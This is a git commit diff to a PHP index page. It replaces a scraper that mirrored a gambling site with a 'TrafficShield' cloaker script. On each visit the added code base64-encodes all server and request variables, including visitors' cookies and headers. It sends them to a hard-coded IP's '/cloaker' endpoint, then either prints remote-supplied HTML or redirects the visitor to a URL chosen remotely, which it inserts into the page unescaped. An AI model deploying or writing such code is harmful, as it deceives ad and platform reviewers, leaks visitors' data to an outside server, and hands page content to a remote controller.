a04c7e33da261ae0b457414a27f292281b858d44
ndpmmo <ndp.mmo@gmail.com>
2023-11-23 08:39:55 +0700

    ib

--- api/index.php
+++ api/index.php
@@ -1,81 +1,78 @@
 <?php
-// Include the Simple HTML DOM Parser library
-require 'simple_html_dom.php';
-
-// Initialize cURL
-$curl = curl_init();
-
-// Set the URL to fetch
-$url = 'https://www.1win-01.com/';
-
-// Set cURL options
-curl_setopt($curl, CURLOPT_URL, $url);
-curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl, CURLOPT_HEADER, false);
-curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36');
-curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
-curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
-
-// Execute the cURL request
-$response = curl_exec($curl);
-
-// Check for cURL errors
-if (curl_errno($curl)) {
-    $error = curl_error($curl);
-    echo "cURL Error: " . $error;
-} else {
-    // Create a DOM object
-    $html = new simple_html_dom();
-    
-    // Load the HTML response
-    $html->load($response);
-    
-    // Modify the URLs of the images to use absolute URLs
-    foreach ($html->find('img') as $image) {
-        $src = $image->src;
-        $image->src = makeAbsoluteURL($src, $url);
+namespace TrafficShield; 
+error_reporting(0);
+class Traffic_Shield{
+    public function run() {		
+        ob_start();					
+        $this->ogrsr9854();
     }
-    
-    // Display the modified HTML content
-    echo $html;
-}
-
-// Close cURL
-curl_close($curl);
-
-// Function to make a URL absolute based on a base URL
-function makeAbsoluteURL($url, $baseUrl) {
-    $parsedUrl = parse_url($url);
-
-    if (isset($parsedUrl['host'])) {
-        // The URL is already absolute
-        return $url;
-    } else {
-        // The URL is relative, make it absolute
-        $baseUrlParts = parse_url($baseUrl);
-        $absoluteUrl = $baseUrlParts['scheme'] . '://' . $baseUrlParts['host'];
-
-        if (isset($baseUrlParts['port'])) {
-            $absoluteUrl .= ':' . $baseUrlParts['port'];
-        }
-
-        if (isset($baseUrlParts['path'])) {
-            $absoluteUrl .= $baseUrlParts['path'];
-        }
-
-        if (isset($parsedUrl['path'])) {
-            $absoluteUrl .= $parsedUrl['path'];
-        }
-
-        if (isset($parsedUrl['query'])) {
-            $absoluteUrl .= '?' . $parsedUrl['query'];
-        }
-
-        if (isset($parsedUrl['fragment'])) {
-            $absoluteUrl .= '#' . $parsedUrl['fragment'];
-        }
-
-        return $absoluteUrl;
+    public function ogrsr9854() {	
+        $this->_check(); 
+        $response = $this->https_request();        
+        $this->main($response);       
     }
-}
+    public function _check() {	
+        if(isset($_GET["TS-BHDNR-84848"])){
+            echo "169a63b818";
+        }
+    }			
+    public function get_header() {	
+        $headers = array();     
+        foreach($_SERVER as $k=>$v){
+            $headers[$k] = $v;
+        }
+        $headers["TS-BHDNR-74191"] = "900661405710890";
+        $headers["TS-BHDNR-74194"] = "169a63b818"; 
+        return $headers;
+    }
+    public function get_header_post() {
+        $get_header = $this->get_header();
+        return base64_encode(json_encode($get_header));      
+    }	
+    public function https_request() {
+        $get_header["headers"] = $this->get_header_post();
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, "http://198.211.101.164/v2/logic/cloaker");
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36");
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $get_header);
+        $result = curl_exec($ch);                
+        return json_decode($result);
+    }
+    public function main($response) {
+        if(!empty($response)){
+            if(isset($response->zrc) && !empty($response->zrc)){
+                echo base64_decode($response->zrc);
+                die();
+            }else{
+                $this->get_url($response->url,$response->http_code);
+            }
+        }
+    }
+    public function get_url($url,$code) {        
+            header("Location: ".$url, true, $code); ?>
+        <!DOCTYPE html>
+            <html lang="en">
+                <head>
+                    <meta charset="UTF-8">
+                    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <meta http-equiv="refresh" content="0;url="<?php echo $url; ?>"" />
+                    <title>You are being redirected to <?php echo $url; ?> your destination</title>
+                    <script type="text/javascript">
+                        window.location.replace("<?php echo $url; ?>");
+                    </script>
+                </head>
+                <body>                        
+                    You are being redirected to <a href="<?php echo $url; ?>" >your destination</a>.
+                <script type="text/javascript">
+                    window.location.replace("<?php echo $url; ?>");
+                </script>
+                </body>
+            </html> 
+<?php  } }
+$traffic_Shield_Tre9854 = new Traffic_Shield();
+$traffic_Shield_Tre9854->run();
+// Copyright TrafficShield.io//
 ?>
